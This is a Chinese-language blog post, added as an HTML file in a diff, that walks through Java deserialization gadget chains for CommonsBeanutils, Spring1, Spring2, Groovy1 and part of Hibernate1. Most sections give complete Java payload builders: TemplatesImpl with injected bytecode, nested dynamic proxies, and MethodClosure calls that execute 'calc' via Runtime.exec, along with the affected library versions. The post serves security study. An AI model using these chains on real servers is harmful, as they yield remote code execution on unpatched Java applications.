@@ -1,0 +1,918 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>java反序列化——CB、Spring、Groovy、Hibernates链 | 1jzz</title>
+<link rel="shortcut icon" href="https://1jzz.github.io/favicon.ico?v=1659229140591">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://1jzz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="java反序列化——CB、Spring、Groovy、Hibernates链 | 1jzz - Atom Feed" href="https://1jzz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="CB
+PropertyUtils
+org.apache.commons.beanutils.PropertyUtils类使用java反射API来调用java对象上的通用属性getter和setter方法。这些方法的具体逻辑其实是org.ap..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://1jzz.github.io">
+  <img class="avatar" src="https://1jzz.github.io/images/avatar.png?v=1659229140591" alt="">
+  </a>
+  <h1 class="site-title">
+    1jzz
+  </h1>
+  <p class="site-description">
+    当人生跌入谷底，剩下的每一步都是向上。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              java反序列化——CB、Spring、Groovy、Hibernates链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-07-31
+              </span>
+              <span>
+                25 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="cb">CB</h1>
+<h2 id="propertyutils">PropertyUtils</h2>
+<p><code>org.apache.commons.beanutils.PropertyUtils</code>类使用java反射API来调用java对象上的通用属性getter和setter方法。这些方法的具体逻辑其实是<code>org.apache.commons.beanutils.PropertyUtilsBean</code>来实现的。<br>
+其中的<code>PropertyUtils#getProperty()</code>方法：‘<br>
+其中有两个参数，一个参数为bean(类对象)和name(属性名)。<br>
+然后调用了<code>PropertyUtilsBean..getProperty(bean, name)</code>方法，获取了这个属性的Property，之后就可以通这个属性的Property来调用其setter和getter方法了。</p>
+<pre><code class="language-java">
+/**
+     * &lt;p&gt;Return the value of the specified property of the specified bean,
+     * no matter which property reference format is used, with no
+     * type conversions.&lt;/p&gt;
+     *
+     * &lt;p&gt;For more details see &lt;code&gt;PropertyUtilsBean&lt;/code&gt;.&lt;/p&gt;
+     *
+     * @param bean Bean whose property is to be extracted
+     * @param name Possibly indexed and/or nested name of the property
+     *  to be extracted
+     * @return the property value
+     *
+     * @exception IllegalAccessException if the caller does not have
+     *  access to the property accessor method
+     * @exception IllegalArgumentException if &lt;code&gt;bean&lt;/code&gt; or
+     *  &lt;code&gt;name&lt;/code&gt; is null
+     * @exception InvocationTargetException if the property accessor method
+     *  throws an exception
+     * @exception NoSuchMethodException if an accessor method for this
+     *  propety cannot be found
+     * @see PropertyUtilsBean#getProperty
+     */
+public static Object getProperty(Object bean, String name)
+    throws IllegalAccessException, InvocationTargetException,
+NoSuchMethodException {
+
+    return (PropertyUtilsBean.getInstance().getProperty(bean, name));
+
+}
+</code></pre>
+<p>调用getter方法的逻辑实现：<br>
+<img src="https://1jzz.github.io/post-images/1659227330403.png" alt="" loading="lazy"></p>
+<h2 id="beancomparator">BeanComparator</h2>
+<p>BeanComparator是commons-beanutils提供的用来比较两个javabean是否相等的类，其实现了<code>java.util.Comparator</code>接口。<br>
+BeanComparator在初始化时可以指定property属性名称和comparator对比器，如果不指定，则默认是ComparableComparator。</p>
+<pre><code class="language-java">
+    /**
+     * Constructs a property-based comparator for beans.
+     * This constructor creates 
+     * a BeanComparator that uses the supplied Comparator to compare 
+     * the property values. 
+     * 
+     * @param property Name of a bean property, can contain the name 
+     * of a simple, nested, indexed, mapped, or combined 
+     * property. See {@link PropertyUtilsBean} for property query language  
+     * syntax. 
+     * @param comparator BeanComparator will pass the values of the 
+     * specified bean property to this Comparator. 
+     * If your bean property is not a comparable or 
+     * contains null values, a suitable comparator 
+     * may be supplied in this constructor.
+     */
+    public BeanComparator( String property, Comparator comparator ) {
+        setProperty( property );
+        if (comparator != null) {
+            this.comparator = comparator;
+        } else {
+            this.comparator = ComparableComparator.getInstance();
+        }
+    }
+</code></pre>
+<p><code>BeanComparator#compare()</code>方法接收两个对象，通过<code>PropertyUtils.getProperty()</code> 方法获取其指定的property的Property对象，然后调用 <code>internalCompare() </code>方法调用实例化时初始化的 comparator 的 compare 方法进行比较。</p>
+<h2 id="构造">构造</h2>
+<p>如果可以直接调用其getter方法的话，就可以像fastjson一样直接通过调用其getOutputProperties方法来触发TemplatesImpl这条链。</p>
+<ul>
+<li>不能在序列化的过程中将TemplatesImpl对象放入，因为TemplatesImpl类未实现Comparable接口，代表其不可比较，需要反射写入</li>
+<li>TemplatesImpl应该放在queue属性中的第一个，否则java.lang.String无法调用getOutputProperties而抛出异常</li>
+<li>当TemplatesImpl是反射写入的时候，那么比较器comparator也必须反射写入，否则java.lang.String无法调用getOutputProperties而抛出异常</li>
+</ul>
+<pre><code class="language-java">public class CB {
+    public static void main(String[] args) throws Exception {
+        byte[] code = SerialUtil.getBytecodes();
+        TemplatesImpl obj = new TemplatesImpl();
+        SerialUtil.setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] {code});
+        SerialUtil.setFieldValue(obj, &quot;_name&quot;, &quot;1jzz&quot;);
+        SerialUtil.setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        BeanComparator bc = new BeanComparator(&quot;outputProperties&quot;);
+        PriorityQueue pq = new PriorityQueue();
+        pq.add(&quot;1&quot;);
+        pq.add(&quot;2&quot;);
+
+        SerialUtil.setFieldValue(pq, &quot;comparator&quot;, bc);
+        SerialUtil.setFieldValue(pq, &quot;queue&quot;, new Object[] {obj, &quot;1&quot;});
+        SerialUtil.unserial(SerialUtil.serial(pq));
+    }
+}
+</code></pre>
+<h2 id="思考">思考</h2>
+<p>以上代码可成功构造反序列化利用，但是有一个问题是，由于 BeanComparator 的默认comparator是ComparableComparator ，这是个 CommonCollections中的类，导致了这明明是一条 CB 的触发链，却要需要CC链的依赖。<br>
+<img src="https://1jzz.github.io/post-images/1659227339686.png" alt="" loading="lazy"><br>
+所以我们需要找到一个comparator来替代默认使用的ComparableComparator 。<br>
+例如<code>java.util.Collections$ReverseComparator</code> 和 <code>java.lang.String$CaseInsensitiveComparator</code>。<br>
+我这里使用<code>java.lang.String$CaseInsensitiveComparator</code>，这样就可以不用CC依赖触发CB链了。<br>
+代码：</p>
+<pre><code class="language-java">public class CB {
+    public static void main(String[] args) throws Exception {
+        byte[] code = SerialUtil.getBytecodes();
+        TemplatesImpl obj = new TemplatesImpl();
+        SerialUtil.setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] {code});
+        SerialUtil.setFieldValue(obj, &quot;_name&quot;, &quot;1jzz&quot;);
+        SerialUtil.setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        BeanComparator bc = new BeanComparator(&quot;outputProperties&quot;);
+        Class clazz = Class.forName(&quot;java.lang.String$CaseInsensitiveComparator&quot;);
+        PriorityQueue pq = new PriorityQueue((Comparator) SerialUtil.getPrivateClass(clazz));
+        pq.add(&quot;1&quot;);
+        pq.add(&quot;2&quot;);
+
+        SerialUtil.setFieldValue(pq, &quot;comparator&quot;, bc);
+        SerialUtil.setFieldValue(pq, &quot;queue&quot;, new Object[] {obj, &quot;1&quot;});
+        SerialUtil.unserial(SerialUtil.serial(pq));
+    }
+}
+</code></pre>
+<h1 id="spring1">Spring1</h1>
+<h2 id="methodinvoketypeprovider">MethodInvokeTypeProvider</h2>
+<p>在spring核心包中存在这样一个内部类：<code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code>这个类实现了TypeProvider接口，TypeProvider接口继承了Serializable接口。<br>
+我们查看一下其readObject方法：</p>
+<ol>
+<li>从provider的Class类中查找方法为methodName的方法</li>
+<li>传入的参数：<code>this.provider.getType()</code>，被作为invoke method的obj，而参数则为new Object[0]，也就是无参方法</li>
+</ol>
+<pre><code class="language-java">static class MethodInvokeTypeProvider implements TypeProvider {
+
+    private final TypeProvider provider;
+
+    private final String methodName;
+
+    private final int index;
+
+    private transient Object result;
+
+    public MethodInvokeTypeProvider(TypeProvider provider, Method method, int index) {
+        this.provider = provider;
+        this.methodName = method.getName();
+        this.index = index;
+        this.result = ReflectionUtils.invokeMethod(method, provider.getType());
+    }
+
+    @Override
+    public Type getType() {
+        if (this.result instanceof Type || this.result == null) {
+            return (Type) this.result;
+        }
+        return ((Type[])this.result)[this.index];
+    }
+
+    @Override
+    public Object getSource() {
+        return null;
+    }
+
+    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException {
+        inputStream.defaultReadObject();
+        Method method = ReflectionUtils.findMethod(this.provider.getType().getClass(), this.methodName);
+        this.result = ReflectionUtils.invokeMethod(method, this.provider.getType());
+    }
+}
+</code></pre>
+<h2 id="objectfactorydelegatinginvocationhandler">ObjectFactoryDelegatingInvocationHandler</h2>
+<p><code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code>是InvocationHandler的实现类，实例化接收一个ObjectFactory对象，并在该InvocationHandler代理时调用的invoke后调用ObjectFactory对象的方法(Method来自于代理类)<br>
+<img src="https://1jzz.github.io/post-images/1659227348201.png" alt="" loading="lazy"></p>
+<h2 id="构造-2">构造</h2>
+<p>步骤：</p>
+<ol>
+<li>生成包含恶意字节码的TemplatesImpl类</li>
+<li>使用AnnotationInvocation动态代理<code>ObjectFactory#getObject()</code>方法，使其返回TemplatesImpl实例</li>
+<li>使用ObjectFactoryDelegatingInvocationHandler动态代理代理上面的ObjectFactory实例，代理一个即实现了Type接口又实现了Templates接口的类。这样的话代理类同时拥有两个接口的方法，既能调用getType()方法，又能调用newTransformer()方法</li>
+<li>使用AnnotationInvocation动态代理<code>TypeProvider#getType()</code>方法</li>
+<li>初始化MethodInvokeTypeProvider对象，随便传一个方法进去</li>
+<li>再通过反射将真正要执行的内容写入到MethodInvokeTypeProvider对象，让其反序列化时执行</li>
+</ol>
+<p>代码：</p>
+<pre><code class="language-java">public class Spring1 {
+    public static void main(String[] args) throws Exception {
+        byte[] code = SerialUtil.getBytecodes();
+        TemplatesImpl obj = new TemplatesImpl();
+        SerialUtil.setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] {code});
+        SerialUtil.setFieldValue(obj, &quot;_name&quot;, &quot;1jzz&quot;);
+        SerialUtil.setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();
+        map.put(&quot;getObject&quot;, obj);
+        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor constructor = clazz.getDeclaredConstructors()[0];
+        constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, map);
+        ObjectFactory&lt;?&gt; objectFactoryProxy = (ObjectFactory) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+                new Class[] {ObjectFactory.class}, handler);
+        
+        Class clazz1 = Class.forName(&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;);
+        Constructor constructor1 = clazz1.getDeclaredConstructors()[0];
+        constructor1.setAccessible(true);
+        InvocationHandler handler1 = (InvocationHandler) constructor1.newInstance(objectFactoryProxy);
+        Type typeTemplatesProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+                new Class[] {Type.class, Templates.class}, handler1);
+
+        HashMap&lt;String, Object&gt; map1 = new HashMap&lt;&gt;();
+        map1.put(&quot;getType&quot;, typeTemplatesProxy);
+        InvocationHandler handler2 = (InvocationHandler) constructor.newInstance(Retention.class, map1);
+        Class clazz2 = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;);
+        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+                new Class[] {clazz2}, handler2);
+
+
+        Class clazz3 = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;);
+        Constructor constructor3 = clazz3.getDeclaredConstructors()[0];
+        constructor3.setAccessible(true);
+        Object object = constructor3.newInstance(typeProviderProxy, Object.class.getMethod(&quot;toString&quot;), 0);
+        SerialUtil.setFieldValue(object, &quot;methodName&quot;, &quot;newTransformer&quot;);
+
+        SerialUtil.unserial(SerialUtil.serial(object));
+    }
+}
+</code></pre>
+<p>思路整理(反向)：</p>
+<ol>
+<li><code>MethodInvokeTypeProvider#readObject()</code>：TypeProvider接口经过AnnotationInvocationHandler代理(调用getType方法)
+<ol>
+<li><code>AnnotationInvocationHandler#invoke()</code>：最后返回了实现了Type和Template接口的Type类实例，也就是我们的代理类(typeTemplatesProxy)</li>
+</ol>
+</li>
+<li><code>typeTemplatesProxy#getClass()</code>：经过AnnotationInvocationHandler代理(getClass方法)
+<ol>
+<li><code>ObjectFactoryDelegatingInvocationHandler#invoke()</code>：Method为getClass，拿到了TemplatesImpl的Class类，</li>
+</ol>
+</li>
+<li><code>ReflectionUtils.findMethod()</code>：因为实现了Templates接口，所以可以拿到newTransformer方法</li>
+<li><code>MethodInvokeTypeProvider#readObject()</code>：TypeProvider接口经过AnnotationInvocationHandler代理(调用getType方法)
+<ol>
+<li><code>AnnotationInvocationHandler#invoke()</code>：最后返回了实现了Type和Template接口的Type类实例，也就是我们的代理类(typeTemplatesProxy)</li>
+</ol>
+</li>
+<li><code>ReflectionUtils.invokeMethod()</code>：这里的target则是代理类(typeTemplatesProxy)，不管调用什么方法，都可以代理到注入了TemplatesImpl的实例中，所以可以执行任意命令</li>
+</ol>
+<p>步骤并不多，但是很多都是调用了动态代理，而动态代理最终的目的都是为了拿到注入了恶意代码的TemplatesImpl对象。<br>
+第一个AnnotationInvocationHandler这个Invocation将getType方法进行代理，使其返回ObjectFactoryDelegatingInvocationHandler代理。<br>
+第二个AnnotationInvocationHandler这个Invocation将所有的值都偷偷换成了TemplatesImpl对象。<br>
+而ObjectFactoryDelegatingInvocationHandler这个Invocation则是通过获取第二个AnnotationInvocationHandler代理，调用了注入了恶意代码的TemplatesImpl对象其相应的任意方法。<br>
+这三个代理，缺一不可，可以看出挖出这条链的人对动态代理非常了解，tql。</p>
+<h2 id="依赖">依赖</h2>
+<p>spring-core : 4.1.4.RELEASE<br>
+spring-beans : 4.1.4.RELEASE<br>
+jdk8</p>
+<h1 id="spring2">Spring2</h1>
+<p>Spring2 在 Spring1 的触发链上有所变换，替换了 spring-beans 的 ObjectFactoryDelegatingInvocationHandler，使用了 spring-aop 的 JdkDynamicAopProxy ，并完成了后续触发 TemplatesImpl 的流程。</p>
+<h2 id="jdkdynamicaopproxy">JdkDynamicAopProxy</h2>
+<p><code>org.springframework.aop.framework.JdkDynamicAopProxy</code>类是Spring AOP框架基于JDK动态代理的实现，同时还实现了AopProxy接口。<br>
+我们来看一下invoke方法，获取了AdvisedSupport对象中的TargetSource属性，之后调用<code>getTarget()</code>方法返回Target。</p>
+<pre><code class="language-java">@Override
+public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+    MethodInvocation invocation;
+    Object oldProxy = null;
+    boolean setProxyContext = false;
+
+    TargetSource targetSource = this.advised.targetSource;
+    Class&lt;?&gt; targetClass = null;
+    Object target = null;
+
+    try {
+        if (!this.equalsDefined &amp;&amp; AopUtils.isEqualsMethod(method)) {
+            // The target does not implement the equals(Object) method itself.
+            return equals(args[0]);
+        }
+        if (!this.hashCodeDefined &amp;&amp; AopUtils.isHashCodeMethod(method)) {
+            // The target does not implement the hashCode() method itself.
+            return hashCode();
+        }
+        if (!this.advised.opaque &amp;&amp; method.getDeclaringClass().isInterface() &amp;&amp;
+            method.getDeclaringClass().isAssignableFrom(Advised.class)) {
+            // Service invocations on ProxyConfig with the proxy config...
+            return AopUtils.invokeJoinpointUsingReflection(this.advised, method, args);
+        }
+
+        Object retVal;
+
+        if (this.advised.exposeProxy) {
+            // Make invocation available if necessary.
+            oldProxy = AopContext.setCurrentProxy(proxy);
+            setProxyContext = true;
+        }
+
+        // May be null. Get as late as possible to minimize the time we &quot;own&quot; the target,
+        // in case it comes from a pool.
+        target = targetSource.getTarget();
+        if (target != null) {
+            targetClass = target.getClass();
+        }
+</code></pre>
+<p>调用<code>AopUtils.invokeJoinpointUsingReflection()</code>方法反射执行相对应的方法。<br>
+<img src="https://1jzz.github.io/post-images/1659227355749.png" alt="" loading="lazy"><br>
+<img src="https://1jzz.github.io/post-images/1659227361854.png" alt="" loading="lazy"><br>
+可以看到如果我们将target替换成了注入了恶意代码的TemplatesImpl实例的话那么相对于Spring1还少了一个动态代理。</p>
+<h2 id="构造-3">构造</h2>
+<p>思路：</p>
+<ol>
+<li><code>MethodInvokeTypeProvider.TypeProvider</code>属性设置为动态代理对象，代理的invocation为AnnotationInvocationHandler</li>
+<li>通过AnnotationInvocationHandler代理将返回一个JdkDynamicAopProxy代理对象</li>
+<li>我们通过<code>AdvisedSupport.setTarget()</code>方法将JdkDynamicAopProxy类中的target修改为注入了恶意代码的TemplatesImpl对象，并且之后将会通过代理调用这个TemplatesImpl对象的所需要执行的方法</li>
+<li><code>ReflectionUtils.findMethod()</code>方法从typetemplatesProxy对象中查找方法(代理了Templates和Type接口)，可以找到newTransformer方法，然后通过<code>ReflectionUtils.invokeMethod()</code>方法执行<code>TemplatesImpl#newTransformer()</code>方法</li>
+</ol>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+    byte[] code = SerialUtil.getBytecodes();
+    TemplatesImpl obj = new TemplatesImpl();
+    SerialUtil.setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] {code});
+    SerialUtil.setFieldValue(obj, &quot;_name&quot;, &quot;1jzz&quot;);
+    SerialUtil.setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+    AdvisedSupport as = new AdvisedSupport();
+    as.setTarget(obj);
+    Class clazz = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;);
+    Constructor constructor = clazz.getDeclaredConstructors()[0];
+    constructor.setAccessible(true);
+    InvocationHandler handler = (InvocationHandler) constructor.newInstance(as);
+    Type typetemplatesProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+                                                            new Class[] {Templates.class, Type.class}, handler);
+
+    HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();
+    map.put(&quot;getType&quot;, typetemplatesProxy);
+    Class clazz3 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+    Constructor constructor3 = clazz3.getDeclaredConstructors()[0];
+    constructor3.setAccessible(true);
+    Class clazz1 = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;);
+    InvocationHandler handler1 = (InvocationHandler) constructor3.newInstance(Retention.class, map);
+    Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+                                                      new Class[] {clazz1}, handler1);
+
+    Class clazz2 = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;);
+    Constructor constructor2 = clazz2.getDeclaredConstructors()[0];
+    constructor2.setAccessible(true);
+    Object object = constructor2.newInstance(typeProviderProxy, Object.class.getMethod(&quot;toString&quot;), 0);
+
+    SerialUtil.setFieldValue(object, &quot;methodName&quot;, &quot;newTransformer&quot;);
+    SerialUtil.unserial(SerialUtil.serial(object));
+}
+</code></pre>
+<h2 id="依赖-2">依赖</h2>
+<p>spring-core : 4.1.4.RELEASE<br>
+spring-aop : 4.1.4.RELEASE<br>
+jdk8</p>
+<h1 id="groovy1">Groovy1</h1>
+<p>Groovy是一种基于JVM的开发语言，具有类似于Python、Ruby、Perl和Smalltalk的功能。Groovy既可以用作java平台的变成语言，也可以用作脚本语言。groovy编译之后生成.class文件，与java编译生成的.class文件无异，因此可以在JVM上运行。</p>
+<h2 id="methodclosure">MethodClosure</h2>
+<p><code>org.codehaus.groovy.runtime.MethodClosure</code>是方法闭包，使用闭包代表了一个对象的一个方法，可以很方便的调用。<br>
+MethodClosure初始化时接收两个参数，一个是实例化对象，一个是对象的方法名称。<br>
+<img src="https://1jzz.github.io/post-images/1659227387173.png" alt="" loading="lazy"><br>
+<code>MethodClosure.doCall()</code>方法执行相应的方法。<br>
+<img src="https://1jzz.github.io/post-images/1659227402434.png" alt="" loading="lazy"><br>
+这样就可以使用MethodClosure执行系统命令：</p>
+<pre><code class="language-java">public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
+    MethodClosure mc = new MethodClosure(Runtime.getRuntime(), &quot;exec&quot;);
+    Method method = mc.getClass().getDeclaredMethod(&quot;doCall&quot;, Object.class);
+    method.setAccessible(true);
+    method.invoke(mc, &quot;calc&quot;);
+}
+</code></pre>
+<p>或者：</p>
+<pre><code class="language-java">public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
+    MethodClosure mc = new MethodClosure(Runtime.getRuntime(), &quot;exec&quot;);
+    mc.call(&quot;calc&quot;);
+}
+</code></pre>
+<h2 id="stringexecute-方法">String.execute() 方法</h2>
+<p>Groovy为String类型添加了<code>execute()</code>方法，以便执行shell命令，该方法会返回一个Process对象。也就是说，在Groovy中，可以直接使用<code>&quot;dir&quot;.execute()</code>这种方式来执行系统命令&quot;dir&quot;。<br>
+最终还是在<code>ProcessGroovyMethods#execute()</code>方法中调用Runtime.getRuntime().exec()方法：<br>
+<img src="https://1jzz.github.io/post-images/1659227442271.png" alt="" loading="lazy"><br>
+可以写为：</p>
+<pre><code class="language-java">public static void main(String[] args) throws IOException {
+    MethodClosure mc = new MethodClosure(&quot;calc&quot;, &quot;execute&quot;);
+    mc.call();
+}
+</code></pre>
+<h2 id="convertedclosure">ConvertedClosure</h2>
+<p><code>org.codehaus.groovy.runtime.ConvertedClosure</code>是一个通用适配器，用于将闭包适配到java接口。ConvertedClosure实现了ConversionHandler类，而ConversionHandler又实现了InvocationHandler。所以ConvertedClosure可以作为动态代理处理器。<br>
+ConvertedClosure构造方法接收一个Closure实例和methodName。在代理时会先调用父类的invoke方法然后再调用<code>ConvertedClosure#invokeCustom()</code>方法。对Closure对象进行代理。<br>
+如果初始化的methodName和调用方法的methodName不相同，那么返回null，所以我们需要找到其代理后所执行的第一个方法，也就是entrySet()方法。<br>
+<img src="https://1jzz.github.io/post-images/1659227424729.png" alt="" loading="lazy"></p>
+<h2 id="构造-4">构造</h2>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+    MethodClosure mc = new MethodClosure(&quot;calc&quot;, &quot;execute&quot;);
+    ConvertedClosure handler = new ConvertedClosure(mc, &quot;entrySet&quot;);
+    Map mapProxy = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+                                                new Class[] {Map.class}, handler);
+
+    Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+    Constructor constructor = clazz.getDeclaredConstructors()[0];
+    constructor.setAccessible(true);
+    InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Retention.class, mapProxy);
+
+    SerialUtil.unserial(SerialUtil.serial(handler1));
+}
+</code></pre>
+<h2 id="依赖-3">依赖</h2>
+<p>Groovy : 1.7.0-2.4.3</p>
+<h1 id="hibernate1">Hibernate1</h1>
+<p>Hibernate是开源的一个ORM框架，用户量极其庞大，Hibernate1依旧是利用TemplatesImpl这个类，寻找<code>_outputProperties</code>属性的getter方法触发。</p>
+<h2 id="basicpropertyaccessor">BasicPropertyAccessor</h2>
+<p>在hibernate中定义了一个接口<code>org.hibernate.property.PropertyAccessor</code>，该接口定义了两个方法：getGetter和getSetter，接收Class对象和属性名，分别返回<code>org.hibernate.property.getGetter</code>和<code>org.hibernate.property.getSetter</code>对象。<br>
+<img src="https://1jzz.github.io/post-images/1659227589995.png" alt="" loading="lazy"><br>
+而<code>org.hibernate.property.BasicPropertyAccessor</code>则是对PropertyAccessor标准实现。在这个类中首先定义了BasicGetter和BasicSetter两个实现类。<br>
+我们来看一下BasicGetter类，构造函数接收三个参数，分别是Class对象，Method对象和属性名。<br>
+<img src="https://1jzz.github.io/post-images/1659227597951.png" alt="" loading="lazy"><br>
+再回到BasicPropertyAccessor类，其getGetter方法调用createGetter方法又调用getGetterOrNull方法来实例化一个BasicGetter对象。<br>
+其中getterMethod方法则是获取属性名的getter方法的实现：</p>
+<ul>
+<li>没有参数列表</li>
+<li>方法类型不为BRIDGE</li>
+<li>方法名以get或者is开头，并且通过<code>Introspector.decapitalize()</code>方法对截断后的方法名的大小写进行判断(前两个字母都为大写则直接返回，否则将第一位字母转为小写)</li>
+</ul>
+<pre><code class="language-java">private static Method getterMethod(Class theClass, String propertyName) {
+    Method[] methods = theClass.getDeclaredMethods();
+    for ( Method method : methods ) {
+        // if the method has parameters, skip it
+        if ( method.getParameterTypes().length != 0 ) {
+            continue;
+        }
+        // if the method is a &quot;bridge&quot;, skip it
+        if ( method.isBridge() ) {
+            continue;
+        }
+
+        final String methodName = method.getName();
+
+        // try &quot;get&quot;
+        if ( methodName.startsWith( &quot;get&quot; ) ) {
+            String testStdMethod = Introspector.decapitalize( methodName.substring( 3 ) );
+            String testOldMethod = methodName.substring( 3 );
+            if ( testStdMethod.equals( propertyName ) || testOldMethod.equals( propertyName ) ) {
+                return method;
+            }
+        }
+
+        // if not &quot;get&quot;, then try &quot;is&quot;
+        if ( methodName.startsWith( &quot;is&quot; ) ) {
+            String testStdMethod = Introspector.decapitalize( methodName.substring( 2 ) );
+            String testOldMethod = methodName.substring( 2 );
+            if ( testStdMethod.equals( propertyName ) || testOldMethod.equals( propertyName ) ) {
+                return method;
+            }
+        }
+    }
+
+    return null;
+}
+</code></pre>
+<p>调用<code>BasicPropertyAccessor#getGetter()</code>方法返回BasicGetter对象，然后调用<code>BasicGetter#get()</code>方法执行其get方法：</p>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+    byte[] code = SerialUtil.getBytecodes();
+    TemplatesImpl obj = new TemplatesImpl();
+    SerialUtil.setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] {code});
+    SerialUtil.setFieldValue(obj, &quot;_name&quot;, &quot;1jzz&quot;);
+    SerialUtil.setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+    BasicPropertyAccessor bpa = new BasicPropertyAccessor();
+    Getter bg = bpa.getGetter(obj.getClass(), &quot;outputProperties&quot;);
+    bg.get(obj);
+}
+</code></pre>
+<h2 id="abstractcomponenttuplizer">AbstractComponentTuplizer</h2>
+<p>接着我们来找一下在那里调用了<code>Getter#get()</code>方法:<br>
+在<code>AbstractComponentTuplizer#getPropertyValues()</code>方法中调用了初始化的Getter对象的get方法。<br>
+<img src="https://1jzz.github.io/post-images/1659227609185.png" alt="" loading="lazy"><br>
+但是AbstractComponentTuplizer是抽象类，我们无法直接利用。<br>
+它有两个子类，分别是DynamicMapComponentTuplizer和PojoComponentTuplizer这对应着Hibernate的实体对象的类型为，分别为pojo类和dynamic-map。pojo代表将Hibernate类型映射为java实体类，而dynamic-map将Hibernate类型映射成map对象。<br>
+<img src="https://1jzz.github.io/post-images/1659227618624.png" alt="" loading="lazy"><br>
+这里使用PojoComponentTuplizer类，它的getPropertyValues()方法将会调用父类的getPropertyValues()方法。<br>
+<img src="https://1jzz.github.io/post-images/1659227631862.png" alt="" loading="lazy"><br>
+接下来我们看一下那里调用了getPropertyValues()方法。<br>
+<img src="https://1jzz.github.io/post-images/1659227639023.png" alt="" loading="lazy"><br>
+其中在<code>ComponentType#getPropertyValue()</code>方法中进行调用。<br>
+<img src="https://1jzz.github.io/post-images/1659227647988.png" alt="" loading="lazy"></p>
+<h2 id="typedvalue">TypedValue</h2>
+<p><code>org.hibernate.engine.spi.TypedValue</code>类是一个final class，用来映射一个Object的值和对应的Hibernate type。<br>
+Hibernate中定义了一个自己的类型接口<code>org.hibernate.type.Type</code>，用来定义java类型和一个或多个JDBC类型之间的映射。针对不同的类型有不同的实现类，开发人员也可以自己实现这个接口来自定义类型。<br>
+而TypedValue就同时存储了一个Type和Object的映射。上一部分最后提到的ComponentType就是Type接口的实现类。<br>
+TypeValue初始化时，除了赋值type、value操作外，还调用了<code>initTransients</code>方法对hashcode属性进行初始化。<br>
+<img src="https://1jzz.github.io/post-images/1659227673467.png" alt="" loading="lazy"><br>
+初始化时实例化了一个ValueHolder对象，并重写了DeferredInitializer 对象中的initialize()方法。</p>
+<p>在<code>TypeValue#hashCode()</code>方法中，调用了成员变量的<code>hashcod.getValue()</code>方法：<br>
+<img src="https://1jzz.github.io/post-images/1659227791519.png" alt="" loading="lazy"><br>
+而<code>ValueHolder#getValue()</code>方法又会调用之前重写的initialize()方法。最终调用了<code>type.getHashCode()</code>方法来获取Hashcode。<br>
+<img src="https://1jzz.github.io/post-images/1659227814915.png" alt="" loading="lazy"><br>
